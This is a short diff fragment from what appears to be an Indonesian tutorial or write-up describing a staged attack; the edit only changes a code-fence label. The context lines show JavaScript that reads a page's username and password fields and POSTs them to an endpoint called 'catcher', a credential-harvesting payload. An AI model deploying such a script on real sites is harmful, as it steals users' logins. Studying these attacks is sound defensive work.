@@ -7,7 +7,7 @@
 
 ## Tahap 2 : Script untuk submit form ##
 
-```html
+```js
 var http = new XMLHttpRequest();
 var params = "PROPERTY=yes&username="+document.getElementById('username').value + "&password="+document.getElementById('password').value;
 http.open("POST", "catcher", true);
